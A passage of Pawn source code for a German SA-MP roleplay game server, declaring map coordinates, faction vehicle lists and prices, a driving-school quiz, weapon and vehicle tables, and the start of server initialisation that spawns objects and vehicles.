{5604.65283, -9345.06934},
{5605.35693, -9351.16797},
{5611.65039, -9327.96582},
{5611.13184, -9335.94141},
{5610.77783, -9345.09766},
{5611.12061, -9351.44824},
{5616.49756, -9351.88574},
{5616.67627, -9344.54492},
{5616.91504, -9336.85645},
{5616.90771, -9327.62305},
{5617.52344, -9320.57227},
{5623.12598, -9321.13086},
{5629.04639, -9320.92676},
{5635.87646, -9320.93359},
{5623.09180, -9328.17578},
{5629.85791, -9328.16504},
{5636.55713, -9328.30176},
{5623.12109, -9337.06836},
{5629.03662, -9336.79590},
{5636.70850, -9336.79492},
{5622.86475, -9344.49219},
{5629.28809, -9344.71094},
{5636.52100, -9344.03516},
{5622.85791, -9351.47656},
{5629.27686, -9351.21680},
{5635.83301, -9350.57227},
{5706.98096, -9285.29297},
{5706.98291, -9276.82813},
{5706.52832, -9268.69629},
{5706.34863, -9261.83789},
{5706.37012, -9255.21191},
{5706.43115, -9248.17480},
{5711.87402, -9248.78516},
{5717.53857, -9249.02148},
{5722.91162, -9248.02344},
{5728.51807, -9248.34961},
{5733.90137, -9248.52051},
{5740.27588, -9248.60840},
{5747.72217, -9248.78223},
{5754.09326, -9248.80469},
{5761.75586, -9248.47949},
{5761.66357, -9255.57813},
{5762.15723, -9263.58887},
{5762.23779, -9271.15430},
{5762.13916, -9278.70215},
{5762.16943, -9285.61035},
{5712.12305, -9254.34180},
{5717.46143, -9254.46289},
{5722.94482, -9254.37402},
{5728.48779, -9254.26270},
{5733.62305, -9254.50391},
{5740.08203, -9254.72266},
{5747.62207, -9254.66016},
{5754.07666, -9255.12402},
{5711.87549, -9261.00391},
{5711.72217, -9268.35645},
{5711.53711, -9276.21289},
{5711.85498, -9283.91992},
{5717.34180, -9260.73242},
{5717.03125, -9267.87695},
{5716.40430, -9275.92969},
{5716.84863, -9284.47852},
{5722.10156, -9260.79102},
{5721.85791, -9267.55371},
{5721.68164, -9274.79297},
{5722.02148, -9283.86719},
{5727.87012, -9260.44824},
{5727.23828, -9267.64941},
{5727.23535, -9275.49121},
{5727.08057, -9283.98535},
{5733.11230, -9275.83984},
{5733.08740, -9283.86621},
{5733.18848, -9267.20020},
{5733.20654, -9259.88672},
{5739.04883, -9268.37207},
{5739.16846, -9260.85449},
{5738.05859, -9275.26270},
{5738.51855, -9283.13379},
{5747.33008, -9261.09473},
{5746.32568, -9267.55176},
{5745.19678, -9275.68750},
{5745.58350, -9283.81836},
{5753.42188, -9262.63867},
{5753.49658, -9269.65332},
{5753.38721, -9277.35645},
{5753.48486, -9283.95996},
{4548.18701, -9278.48438},
{4554.69922, -9278.58594},
{4560.92432, -9279.04590},
{4566.35645, -9278.61719},
{4572.84717, -9278.61914},
{4579.79980, -9278.42285},
{4586.77783, -9278.13086},
{4594.17090, -9278.21777},
{4547.42383, -9271.14746},
{4546.86670, -9263.93262},
{4546.96924, -9256.58691},
{4546.64697, -9248.76660},
{4546.71533, -9241.23535},
{4552.96387, -9264.64941},
{4553.73486, -9271.19629},
{4552.00000, -9255.81836},
{4552.17041, -9247.98242},
{4551.87939, -9241.25098},
{4558.43164, -9263.84570},
{4559.94678, -9271.12695},
{4557.84326, -9254.58301},
{4557.72461, -9246.16699},
{4557.62402, -9240.72949},
{4563.52344, -9239.78320},
{4563.24463, -9253.70313},
{4563.32666, -9246.26855},
{4564.91553, -9262.98340},
{4566.48242, -9270.91992},
{4572.69287, -9271.13770},
{4571.04297, -9262.66992},
{4570.51270, -9253.55176},
{4570.13330, -9247.21582},
{4569.93359, -9240.44727},
{4577.08984, -9239.62109},
{4577.81787, -9246.97949},
{4578.47168, -9254.16309},
{4578.17725, -9261.85059},
{4578.40918, -9270.49414},
{4586.44434, -9270.64746},
{4586.39648, -9262.25000},
{4587.27344, -9254.82715},
{4586.55029, -9245.56543},
{4586.08545, -9238.84570},
{4594.48096, -9271.41992},
{4594.20313, -9262.51270},
{4594.48486, -9254.25781},
{4594.05566, -9247.39941},
{4593.53125, -9240.01074},
{4603.10596, -9279.07617},
{4602.95361, -9272.61914},
{4602.06445, -9263.13867},
{4602.04443, -9254.67969},
{4601.82031, -9247.29297},
{4601.92871, -9241.02930},
{4540.29492, -9324.88184},
{4534.72559, -9324.52637},
{4528.79736, -9324.27832},
{4522.21094, -9324.63672},
{4515.54834, -9324.41309},
{4508.17822, -9324.08105},
{4500.88867, -9324.85938},
{4493.00195, -9324.64063},
{4485.46533, -9324.64355},
{4540.23926, -9331.48242},
{4540.51758, -9338.57617},
{4540.82861, -9346.25879},
{4540.56934, -9353.47363},
{4540.56055, -9361.29590},
{4533.81885, -9362.15039},
{4533.39502, -9354.05664},
{4534.10352, -9346.23730},
{4534.12061, -9338.66113},
{4534.59521, -9331.30566},
{4527.96875, -9330.00098},
{4527.44629, -9337.94043},
{4527.95703, -9346.13184},
{4527.80371, -9353.85156},
{4527.24365, -9362.52832},
{4508.26318, -9330.08008},
{4515.32227, -9329.81348},
{4521.36426, -9330.12500},
{4508.08838, -9336.27539},
{4515.20850, -9336.33105},
{4521.59912, -9337.13379},
{4521.99463, -9346.30078},
{4515.10059, -9344.72754},
{4508.11865, -9344.22363},
{4521.42236, -9353.30469},
{4508.13330, -9352.12402},
{4508.44922, -9360.72363},
{4515.11670, -9353.02051},
{4514.65186, -9360.66895},
{4520.79004, -9361.11230},
{4501.03613, -9331.13770},
{4492.47412, -9330.39160},
{4485.92969, -9330.14453},
{4485.28174, -9337.60059},
{4500.08057, -9337.03809},
{4491.66162, -9337.01270},
{4499.97217, -9344.15527},
{4501.10742, -9352.79395},
{4501.80322, -9361.13867},
{4492.73145, -9344.19336},
{4484.83252, -9344.03613},
{4485.08105, -9351.43262},
{4493.74268, -9352.12012},
{4494.05615, -9360.26563},
{4486.67725, -9359.58496}
};
new LSPDGate;
new sfpdgate;
new LSPDGATEOFFEN;
new TOROFFEN[22];
/*enum sStats
{
	Fische,
	Tode,
	Kills,
	Verhaftungen
}

new Statistik[MAX_PLAYERS][sStats];*/
enum fraklager
{
	matss,
	drogenn,
	fraktionsid
}
new LInfo[7][fraklager];
enum rdata
{
    RouteID,
    Ziel,
    Calculating,
    rArray[200]
}

new Route[MAX_PLAYERS][rdata];

new SkinsMaenner[135] = {
	1,
	2,
	3,
	4,
	5,
	6,
	7,
	8,
	15,
	17,
	18,
	19,
	20,
	21,
	22,
	23,
	24,
	25,
	26,
	28,
	29,
	30,
	32,
	33,
	34,
	35,
	36,
	37,
	43,
	44,
	45,
	46,
	47,
	48,
	49,
	50,
	51,
	52,
	57,
	58,
	59,
	60,
	66,
	67,
	68,
	72,
	73,
	78,
	79,
	82,
	83,
	84,
	94,
	95,
	96,
	97,
	98,
	99,
	100,
	101,
	119,
	121,
	128,
	132,
	133,
	134,
	135,
	136,
	137,
	143,
	144,
	146,
	147,
	153,
	154,
	156,
	158,
	159,
	160,
	161,
	162,
	167,
	170,
	171,
	172,
	176,
	177,
	179,
	180,
	181,
	182,
	183,
	184,
	185,
	186,
	187,
	188,
	189,
	200,
	202,
	203,
	204,
	206,
	208,
	210,
	212,
	213,
	223,
	227,
	228,
	229,
	230,
	234,
	235,
	236,
	239,
	240,
	241,
	242,
	249,
	250,
	252,
	258,
	259,
	261,
	262,
	273,
	289,
	290,
	291,
	292,
	293,
	296,
	297,
	299
};
new SkinsFrauen[53] = {
9,
10,
11,
12,
31,
93,
40,
41,
53,
54,
55,
56,
69,
76,
77,
88,
89,
90,
91,
92,
93,
129,
130,
131,
138,
139,
140,
141,
145,
148,
150,
151,
157,
172,
190,
192,
193,
194,
196,
197,
198,
199,
201,
205,
218,
119,
224,
225,
226,
232,
233,
251,
298
};

new AutoListe[17][12] = {
{427,430,497,523,528,596,599,601,426,-1,-1,-1},//LSPD
{427,430,497,523,528,597,599,601,426,-1,-1,-1},//SFPD
{416,490,563,472,407,544,525,573,-1,-1,-1,-1},//SFFR
{416,490,563,472,407,544,525,573,-1,-1,-1,-1},//LSFR
{525,552,611,561,-1,-1,-1,-1,-1,-1,-1,-1},//ADAC
{582,586,585,488,-1,-1,-1,-1,-1,-1,-1,-1},//City Radio
{518,492,466,418,412,536,575,-1,-1,-1,-1},//Ballas
{518,492,466,418,412,536,575,-1,-1,-1,-1,-1},//Grove Street
{518,492,466,418,412,536,575,-1,-1,-1,-1,-1},//Aztecas
{580,545,445,401,475,491,547,579,-1,-1,-1,-1},//Russische Mafia
{580,545,445,401,475,491,547,579,-1,-1,-1,-1},//Yakuza
{580,545,445,401,475,491,547,579,-1,-1,-1,-1},//Hitman
{416,490,563,472,-1,-1,-1,-1,-1,-1,-1,-1},//Krankenhaus
{407,490,544,563,472,416,-1,-1,-1,-1,-1,-1},//Feuerwehr
{417,425,432,433,470,490,520,548,595,-1,-1,-1},//Army
{518,492,466,418,412,536,575,-1,-1,-1,-1},//Vagos
{459,461,463,586,-1,-1,-1,-1,-1,-1,-1}//Mayans MC
};

new AutoListePreise[17][] = {//Frakeinstellung
{20000,11800,60500,7200,22400,13300,14500,48800,20000},//LSPD
{20000,11800,60500,7200,22400,13300,14500,48800,20000},//SFPD
{15000,16200,85500,6000,26000,36000,15000,38000},//SFFR
{15000,16200,85500,6000,26000,36000,15000,38000},//LSFR
{35200,14800,21000,17500,18200},//NICHT VORHANDEN
{35000,12600,2500,25300},//NICHT VORHANDEN
{13400,15500,7200,5900,6000,11000,6500},//BALLAS
{13400,15500,7200,5900,6000,11000,6500},//GROVE
{13400,15500,7200,5900,6000,11000,6500},//Atzecas
{12500,55000,5500,15000,5500,19800,8000,27000},//Russische Mafia
{12500,55000,5500,15000,5500,19800,8000,27000},//YAKUZA
{12500,85000,5500,17000,6500,24800,9000,37000},//Hitman
{26000,24200,122500,6000},//NICHT VORHANDEN
{55000,14800,48000,180000,6000,22000},//NICHT VORHANDEN
{68000,80000,85000,32000,25000,19000,100000,58000,22000},//ARMY
{15400,18500,7200,5900,6000,11000,6500},//Vagos
{5700,7500,5900,6400}//Mayans MC
};
enum blitzerinfo
{
	blitzerid,
	blitzgw,
	Float:blitzx,
	Float:blitzy,
	Float:blitzz,
	Float:blitza,
	blitzcreate
}
new Blitzer[3][blitzerinfo];
#define MAX_SPERRE 15
enum sperreinfo
{
	sperreid,
	Float:sperrex,
	Float:sperrey,
	Float:sperrez,
	Float:sperrea,
	sperrecreate
}
new Sperre[MAX_SPERRE][sperreinfo];
enum Einfo
{
	Float:EingangX,
	Float:EingangY,
	Float:EingangZ,
	Float:EingangRZ,
	Float:AusgangX,
	Float:AusgangY,
	Float:AusgangZ,
	Float:AusgangRZ
}

new Float:Eingaenge[4][Einfo] = {
{-2942.6301,1602.0122,11.2203,90.0000,-2941.5901,1601.8950,11.2203,270.5410},//KH
{-1978.4332,1896.6479,14.1300,0.2039,-1978.3750,1895.4053,14.1300,180.20},//PD
{-2043.7928,1807.4454,11.3000,0.0000,-2043.7786,1805.9441,11.3000,180.0000},//Fahrschule
{-2151.3362,2008.3931,11.2133,270.0000,-2168.7124,2012.4548,71.4426,180.000}//FBI
};



new Abschleppen[MAX_VEHICLES],Float:APosX[MAX_VEHICLES],Float:APosY[MAX_VEHICLES];



enum fstInfo
{
	Frage[120],
	Antwort1[80],
	Antwort2[80],
	Antwort3[80],
	Richtig[2]
}

new FahrschulTheoretisch[8][fstInfo] = {
{"Welche Geschwindigkeit muss im Ortsgebiet eingehalten werden?","A.: 100 km/h","B.: 80 km/h","C.: 60 km/h","B"},
{"Wie verhalte ich mich bei einem kommenden Einsatzfahrzeug mit eingeschalteter Sirene?","A.: Ich fahre langsamer","B.: Ich fahre rechts ran und bleibe stehen","C.: Ich fahre einfach schneller","B"},
{"Die Ampel ist rot?","A.: Ampeln muessen nur am Tag beachtet werden","B.: Ampeln muessen nicht beachtet werden","C.: Ampeln muessen immer beachetet werden","C"},
{"Eine Kreuzung ohne Ampeln, aber mit Schilder, wer hat Vorfahrt?","A.: Rechts vor Links","B.: Derjenige mit dem Dreieckigen Schild (Innen weiss, aussen rot)","C.: Ein Einsatzfahrzeug ohne Blaulicht und Sirene","B"},
{"Wann duerfen Fahrzeuge ueberholen?","A.: Ueberholen nur Innenorts","B.: Ueberholen ist Grundsaetzlich verboten","C.: Nur Aussenorts","C"},
{"Wann muss das Licht eingeschaltet werden?","A.: Ab 20:00 Uhr","B.: Ab 21:00 Uhr","C.: Keine Lichtpflicht","A"},
{"Wann muss das Licht wieder ausgeschalten werden?","A.: Ab 05:00 Uhr","B.: Ab 06:30 Uhr","C.: Ab 6:00","C"},
{"Wo duerfen Fahrzeuge geparkt werden?","A.: Parkplaetze/Grundstuecke","B.: Parkplaetze/Halb-Strasse und Halb-Gehsteig","C.: Vor der Feuerwehreinfahrt","A"}
};

new WaffenName[][] = {
	{"Faust"}, // 0
	{"Schlagring"}, // 1
	{"Golfschläger"}, // 2
	{"Schlagstock"}, // 3
	{"Messer"}, // 4
	{"Baseballschläger"}, // 5
	{"Schaufel"}, // 6
	{"Pool Cue"}, // 7
	{"Katana"}, // 8
	{"Kettensege"}, // 9
	{"Lila Dildo"}, // 10
	{"Großer Weißer Vibrator"}, // 11
	{"Mittler Weißer Vibrator"}, // 12
	{"Kleiner Weißer Vibrator"}, // 13
	{"Blumen"}, // 14
	{"Stock"}, // 15
	{"Granate"}, // 16
	{"Tränengas"}, // 17
	{"Molotov"}, // 18
	{"-"}, // 19
	{"-"}, // 20
	{"-"}, // 21
	{"9mm"}, // 22
	{"9mm + Schalldämpfer"}, // 23
	{"Desert Eagle"}, // 24
	{"Schrotflinte"}, // 25
	{"Abgesägte Schrotflinte"}, // 26
	{"Combat Schrotflinte"}, // 27
	{"Micro Uzi"}, // 28
	{"MP5"}, // 29
	{"AK47"}, // 30
	{"M4"}, // 31
	{"Tec9"}, // 32
	{"Country Rifle"}, // 33
	{"Sniper Rifle"}, // 34
	{"Rocket Launcher"}, // 35
	{"Heat-Seeking Rocket Launcher"}, // 36
	{"Flamethrower"}, // 37
	{"Minigun"}, // 38
	{"Rucksackbombe"}, // 39
	{"Detonator"}, // 40
	{"Spray Can"}, // 41
	{"Fire Extinguisher"}, // 42
	{"Camera"}, // 43
	{"Night Vision Goggles"}, // 44
	{"Infrared Vision Goggles"}, // 45
	{"Fallschirm"}, // 46
	{"Fake Pistol"} // 47
};

enum vdaten
{
	vname[30],
	vspeed
}
new VehicleMaxSpeed[][vdaten] =
{
	{!"Landstalker", 140},
	{!"Bravura", 131},
	{!"Buffalo", 166},
	{!"Linerunner", 98},
	{!"Pereniel", 118},
	{!"Sentinel", 146},
	{!"Dumper", 98},
	{!"Firetruck", 132},
	{!"Trashmaster", 89},
	{!"Stretch", 140},
	{!"Manana", 115},
	{!"Infernus", 197},
	{!"Voodoo", 150},
	{!"Pony", 98},
	{!"Mule", 94},
	{!"Cheetah", 171},
	{!"Ambulance", 137},
	{!"Leviathan", 399},
	{!"Moonbeam", 103},
	{!"Esperanto", 133},
	{!"Taxi", 129},
	{!"Washington", 137},
	{!"Bobcat", 124},
	{!"Mr Whoopee", 88},
	{!"BF Injection", 120},
	{!"Hunter", 399},
	{!"Premier", 154},
	{!"Enforcer", 147},
	{!"Securicar", 139},
	{!"Banshee", 179},
	{!"Predator", 399},
	{!"Bus", 116},
	{!"Rhino", 84},
	{!"Barracks", 98},
	{!"Hotknife", 148},
	{!"Trailer", 0},
	{!"Previon", 133},
	{!"Coach", 140},
	{!"Cabbie", 127},
	{!"Stallion", 150},
	{!"Rumpo", 121},
	{!"RC Bandit", 67},
	{!"Romero", 124},
	{!"Packer", 112},
	{!"Monster Truck A", 98},
	{!"Admiral", 146},
	{!"Squalo", 399},
	{!"Seasparrow", 399},
	{!"Pizzaboy", 162},
	{!"Tram", 399},
	{!"Trailer", 399},
	{!"Turismo", 172},
	{!"Speeder", 399},
	{!"Reefer", 399},
	{!"Tropic", 399},
	{!"Flatbed", 140},
	{!"Yankee", 94},
	{!"Caddy", 84},
	{!"Solair", 140},
	{!"Berkley's RC Van", 121},
	{!"Skimmer", 399},
	{!"PCJ-600", 180},
	{!"Faggio", 155},
	{!"Freeway", 180},
	{!"RC Baron", 399},
	{!"RC Raider", 399},
	{!"Glendale", 131},
	{!"Oceanic", 125},
	{!"Sanchez", 164},
	{!"Sparrow", 399},
	{!"Patriot", 139},
	{!"Quad", 98},
	{!"Coastguard", 399},
	{!"Dinghy", 399},
	{!"Hermes", 133},
	{!"Sabre", 154},
	{!"Rustler", 399},
	{!"ZR-350", 166},
	{!"Walton", 105},
	{!"Regina", 124},
	{!"Comet", 164},
	{!"BMX", 86},
	{!"Burrito", 139},
	{!"Camper", 109},
	{!"Marquis", 399},
	{!"Baggage", 88},
	{!"Dozer", 56},
	{!"Maverick", 399},
	{!"News Chopper", 399},
	{!"Rancher", 124},
	{!"FBI Rancher", 139},
	{!"Virgo", 132},
	{!"Greenwood", 125},
	{!"Jetmax", 399},
	{!"Hotring", 191},
	{!"Sandking", 157},
	{!"Blista Compact", 145},
	{!"Police Maverick", 399},
	{!"Boxville", 96},
	{!"Benson", 109},
	{!"Mesa", 125},
	{!"RC Goblin", 399},
	{!"Hotring Racer", 191},
	{!"Hotring Racer", 191},
	{!"Bloodring Banger", 154},
	{!"Rancher", 124},
	{!"Super GT", 159},
	{!"Elegant", 148},
	{!"Journey", 96},
	{!"Bike", 93},
	{!"Mountain Bike", 117},
	{!"Beagle", 399},
	{!"Cropdust", 399},
	{!"Stunt", 399},
	{!"Tanker", 107},
	{!"RoadTrain", 126},
	{!"Nebula", 140},
	{!"Majestic", 140},
	{!"Buccaneer", 146},
	{!"Shamal", 399},
	{!"Hydra", 399},
	{!"FCR-900", 190},
	{!"NRG-500", 200},
	{!"HPV1000", 172},
	{!"Cement Truck", 116},
	{!"Tow Truck", 143},
	{!"Fortune", 140},
	{!"Cadrona", 133},
	{!"FBI Truck", 157},
	{!"Willard", 133},
	{!"Forklift", 54},
	{!"Tractor", 62},
	{!"Combine", 98},
	{!"Feltzer", 148},
	{!"Remington", 150},
	{!"Slamvan", 140},
	{!"Blade", 154},
	{!"Freight", 399},
	{!"Streak", 399},
	{!"Vortex", 89},
	{!"Vincent", 136},
	{!"Bullet", 180},
	{!"Clover", 146},
	{!"Sadler", 134},
	{!"Firetruck", 132},
	{!"Hustler", 131},
	{!"Intruder", 133},
	{!"Primo", 127},
	{!"Cargobob", 399},
	{!"Tampa", 136},
	{!"Sunrise", 128},
	{!"Merit", 140},
	{!"Utility", 108},
	{!"Nevada", 399},
	{!"Yosemite", 128},
	{!"Windsor", 141},
	{!"Monster Truck B", 98},
	{!"Monster Truck C", 98},
	{!"Uranus", 139},
	{!"Jester", 158},
	{!"Sultan", 150},
	{!"Stratum", 137},
	{!"Elegy", 158},
	{!"Raindance", 399},
	{!"RC Tiger", 79},
	{!"Flash", 146},
	{!"Tahoma", 142},
	{!"Savanna", 154},
	{!"Bandito", 130},
	{!"Freight", 399},
	{!"Trailer", 399},
	{!"Kart", 83},
	{!"Mower", 54},
	{!"Duneride", 98},
	{!"Sweeper", 53},
	{!"Broadway", 140},
	{!"Tornado", 140},
	{!"AT-400", 399},
	{!"DFT-30", 116},
	{!"Huntley", 140},
	{!"Stafford", 136},
	{!"BF-400", 170},
	{!"Newsvan", 121},
	{!"Tug", 76},
	{!"Trailer", 399},
	{!"Emperor", 136},
	{!"Wayfarer", 175},
	{!"Euros", 147},
	{!"Hotdog", 96},
	{!"Club", 145},
	{!"Trailer", 399},
	{!"Trailer", 399},
	{!"Andromada", 399},
	{!"Dodo", 399},
	{!"RC Cam", 54},
	{!"Launch", 399},
	{!"Police Car (LSPD)", 156},
	{!"Police Car (SFPD)", 156},
	{!"Police Car (LVPD)", 156},
	{!"Police Ranger", 140},
	{!"Picador", 134},
	{!"S.W.A.T. Van", 98},
	{!"Alpha", 150},
	{!"Phoenix", 152},
	{!"Glendale", 131},
	{!"Sadler", 134},
	{!"Luggage Trailer", 399},
	{!"Luggage Trailer", 399},
	{!"Stair Trailer", 399},
	{!"Boxville", 96},
	{!"Farm Plow", 399},
	{!"Utility Trailer", 399}
};

main()
{
	print("\n----------------------------------");
	print(" Selfmade by Andy & Moritz");
	print("----------------------------------\n");
}
new LSDOOR[5];
new PDTUER[5];
new LSMDDOORS[2];
new LSMDDOOR[2];
new ARMYDOORZELLE[10];
new ARMYDOORZELLE1;
new LSFDDOORS[2];
new LSFDDOOR[2];
new PDZELLE[6];
new PDZELLEOP[6];
new BALLASDOORS[2];
new GROVEDOORS[1];
new LCNDOORS[1];
new LCNDOOR[1];
new ATZECASDOOR[2];
new ATZECASDOORS[2];
new GROVEDOOR[1];
new BALLASDOOR[2];
new wetter;
new Fahrschulautos[4];
new Fahrschulmoto[2];
new Fahrschullkw[1];
new VAGOSDOOR[2];
new BIKERDOOR[2];
new VAGOSDOORs[2];
new BIKERDOORs[2];
new anticheatpl[MAX_PLAYERS],anticheatpl2w[MAX_PLAYERS],anticheatpl2[MAX_PLAYERS];
new industrie1;
new industrie2;
new industrie3;
new industrie4;
new industrie5;
new industrie6;
new industrie7;
new industrie8;
new industrie9;
new industrie10;
new industrie11;
new industrie12;
new LSHaupt;
new Flughafenzone;
new BSN2;
new StrasseLSklein1;
new BallasLS1;
new BallasLS2;
new Street_Noobspawn1;
new Street_Noobspawn2;
new Spawn1;
new DonatorIsland1;
new Autobahn1;
new Portlandstreet1;
new Portland1;
new Bergstreet;
new SF1;
new LV_SF;
new SF_LV;
new LV1;
new LS_Street;
new Bergland;
new Bergland2;
new LSStrasse1;
new LSStrasse2;
new kleinparkplatz1;
new LSPDStrasse3;
new LSLV1;
new Wohnhauser1;
new HauptS1;
new HauptS2;
new BSN1;
new Kreuzung1;
new Kreuzung2;
new Ballas1;
new Ballas2;
new Ballas3;
new Ballas4;
new WrongHillStr1;
new WrongHolle1;
new GangStrasseHaupt1;
new GangstrasseLinks1;
new GangstrasseHInten1;
new GangstrasseRechts1;
new GangstrasseMitteLinks1;
new GangstrasseMitteRechts1;
new LVSFStrasse1;
new LVStrasse;
new LVStrasseganzhinten1;
new LVStrassehintenfw1;
new SFWohnStrasse1;
new Hauptstrasselang1SF;
new HauptstrassekurzSF1;
new SFStrassehinten1;
new MullSF1;
new SFAutobahnstr1;
new LSzurKurve1;
new EckeVergessen1;
new EckeVergessen2;
new Autobahnsure1;
new Spawnstrasse1;
new Armybase;
new Armystrasse;
new EventHouse;
new EventStrasse;
new LVAirfieldStreeet1;
new LVAirfieldStreeet2;
new LVAirfieldStreeet3;
new StreetLV1;
new StreetLV3;
new StreetLV4;
new StreetLV5;
new StreetLV6;
new ARMYDOOR[4];
new ARMYDOOR1[4];
new Werbungschreiben;
new Tresortuer;
new Fernbedienung;
new Rakete;
new TraegerTur[3];
new tuersetzen1;
new tuertimer1;
new tuersetzen2;
new tuertimer2;
new tuersetzen3;
new tuertimer3,
tuersetzen4,
tuertimer4;
new treagerstop = 0;
new BunkerTor[3];
new BunkerTorx[3];
public OnGameModeInit()
{
    Streamer_VisibleItems(0,1000);
	generate_tree();
    Werbungschreiben = 0;
    bombenklauen = 0;
    ConnectNPC("SchwarzMarkt","SchwarzMarkt");
    Musikbox[0] = -1;
    Musikbox[1] = -1;
    Musikbox[2] = -1;
    Banktimer = 0;
    bankdarf = 1;
    Banktimer2 = 0;
    truckercp = 0;
	frakpayday  = 60;
    wetter = 5;
    gangwaran = 0;
    gangwarteam1 = -1;
    gangwarteam2 = -1;
    gangwarzonenid = -1;
    gangwarteam1kills = -1;
    gangwarteam2kills = -1;
	Streamer_VisibleItems(STREAMER_TYPE_OBJECT,980);
	Streamer_TickRate(5);
	//SendRconCommand("loadfs CIMap");
	//CHARS
	AddCharModel(287, 25001, "army.dff", "army.txd");
	AddCharModel(287, 25002, "swat.dff", "swat.txd");
	AddCharModel(287, 25003, "army2.dff", "army2.txd");
	AddCharModel(287, 25004, "lapdm1.dff", "lapdm1.txd");
	AddCharModel(287, 25005, "sfpd1.dff", "sfpd1.txd");
	AddCharModel(287, 25006, "laemt1.dff", "laemt1.txd");
	AddCharModel(287, 25007, "lvemt1.dff", "lvemt1.txd");
	AddCharModel(287, 25008, "EmotionGuy.dff", "EmotionGuy.txd");
	Tresortuer = CreateDynamicObject(19619, 1436.43591, -7563.22510, 11.88010,   0.00000, 0.00000, 180.00000);//Tresortür nach sprengung 0.0000, 0.0000, 105.0000
	Fernbedienung = CreateDynamicObject(19942, 1436.01477, -7563.50684, 11.92980,   0.00000, 90.00000, -164.00000);
	Rakete = CreateDynamicObjectEx(3790, 4479.2637, -8703.7529, 8.4806,   0.00000, 90.00000, -90.00000,250.0, 250.0); //IN DER LUFT 4478.92871, -8704.22656, 243.55969 // RAKETE
    TraegerTur[0] = CreateDynamicObject(19799, 1427.43787, -7537.79297, 19.24610,   0.00000, 0.00000, 90.00000);
    TraegerTur[1] = CreateDynamicObject(19799, 1428.59412, -7541.41357, 12.19320,   0.00000, 0.00000, 0.00000);
    TraegerTur[2] = CreateDynamicObject(19799, 1429.62158, -7577.70264, 4.17059,   0.00000, 0.00000, 180.00000);
    new Float:casinopoints[] = {-2427.9878,1577.7440,-2437.8523,1577.7697,-2438.0449,1579.8600,-2454.2397,1579.8417,-2454.4343,1598.2087,-2437.6772,1598.2159,-2437.9297,1610.9216,-2427.7832,1611.0126};
	CasinoZone = CreateDynamicPolygon(casinopoints,5,17,16);
	Fahrschulautos[0] = AddStaticVehicleEx(421,1584.2006,-8416.5703,2.0104,269.7180,1,1,1); // fahrschuleauto
	Fahrschulautos[1] = AddStaticVehicleEx(421,1592.7207,-8416.5117,2.0104,269.5482,1,1,1); // fahrschuleauto
	Fahrschulautos[2] = AddStaticVehicleEx(421,1601.3281,-8416.4795,2.0104,270.5233,1,1,1); // fahrschuleauto
	Fahrschulautos[3] = AddStaticVehicleEx(421,1609.6455,-8416.4629,2.0104,271.3126,1,1,1); // fahrschuleauto
	Fahrschullkw[0] = AddStaticVehicleEx(456,1621.3805,-8416.6152,2.3026,270.9442,1,1,1); // fahrschulelkw
	Fahrschulmoto[0] = AddStaticVehicleEx(586,1628.5435,-8415.5371,1.6481,272.9059,1,1,1); // fahrschulemotorrad
	Fahrschulmoto[1] = AddStaticVehicleEx(586,1632.2416,-8415.5371,1.6355,270.2295,1,1,1); // fahrschulemotorrad
	Trucker[0] = AddStaticVehicleEx(498,6306.1128,-9361.2666,4.4705,270.6837,1,1,240); // Packetcar 1
	Trucker[1] = AddStaticVehicleEx(414,6306.2188,-9353.7705,4.4979,271.0756,1,1,240); // Packetcar 2
	Trucker[2] = AddStaticVehicleEx(499,6306.4316,-9346.2637,4.3962,272.3441,1,1,240); // Packetcar 3
	Trucker[3] = AddStaticVehicleEx(584, 4073.8564, -9287.8281, 5.4443, -90.0000, -1, -1, 240);//Tankhänger
	Trucker[4] = AddStaticVehicleEx(584, 4074.0740, -9281.8145, 5.4443, -90.0000, -1, -1, 240);//Tankhänger
	Trucker[5] = AddStaticVehicleEx(584, 4073.9817, -9275.4941, 5.4443, -90.0000, -1, -1, 240);//Tankhänger
	Trucker[6] = AddStaticVehicleEx(514,4102.7588,-9274.5459,4.9665,178.1919,1,1, 240); // Truck 1
	Trucker[7] = AddStaticVehicleEx(403,4108.1323,-9274.8965,4.9972,179.9270,1,1, 240); // Truck 2
	Trucker[8] = AddStaticVehicleEx(515,4097.5664,-9274.3281,5.4738,179.6461,1,1,240); // Truck 3
	BunkerTor[0] = CreateDynamicObjectEx(2957, 1611.40576, -9196.11035, 6.22639,   0.00000, 0.00000, 90.00000, 200.0, 200.0);//TOR GROSS
    BunkerTor[1] = CreateDynamicObjectEx(2957, 1617.80310, -9202.63184, 6.22640,   0.00000, 0.00000, 0.00000, 200.0, 200.0);//TOR
    BunkerTor[2] = CreateDynamicObjectEx(2957, 1623.98999, -9196.04102, 6.22640,   0.00000, 0.00000, 90.00000, 200.0, 200.0);//TOR
	
	SetVehicleNumberPlate(Fahrschulautos[0],"Fahrschule"); SetVehicleToRespawn(Fahrschulautos[0]);
	SetVehicleNumberPlate(Fahrschulautos[1],"Fahrschule"); SetVehicleToRespawn(Fahrschulautos[1]);
	SetVehicleNumberPlate(Fahrschulautos[2],"Fahrschule"); SetVehicleToRespawn(Fahrschulautos[2]);
	SetVehicleNumberPlate(Fahrschulautos[3],"Fahrschule"); SetVehicleToRespawn(Fahrschulautos[3]);
	SetVehicleNumberPlate(Fahrschullkw[0],"Fahrschule");   SetVehicleToRespawn(Fahrschullkw[0]);
	SetVehicleNumberPlate(Fahrschulmoto[0],"Fahrschule");  SetVehicleToRespawn(Fahrschulmoto[0]);
	SetVehicleNumberPlate(Fahrschulmoto[1],"Fahrschule");  SetVehicleToRespawn(Fahrschulmoto[1]);
	for(new x = 0; x < MAX_SPERRE; x++)
    {
        Sperre[x][sperreid] = -1;
    }
	Werbeschild1 = CreateDynamicObjectEx(8332, 1772.28491, -8753.38770, 23.84770,   0.00000, 0.00000, -131.00000, 250.00, 250.00);
    SetDynamicObjectMaterialText(Werbeschild1,0, "Hier koennte Ihre Werbung stehen!", 120, "Gabriola", 85, 0, 0xFFFFFFFF, 0xFF0E316D, 1);

    ARMYDOORZELLE[0] = CreateDynamicObjectEx(19302, 4509.88379, -8689.21973, 4.65460,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	ARMYDOORZELLE[1] = CreateDynamicObjectEx(19302, 4513.50342, -8689.21973, 4.65460,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	ARMYDOORZELLE[2] = CreateDynamicObjectEx(19302, 4517.12646, -8689.21973, 8.51520,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
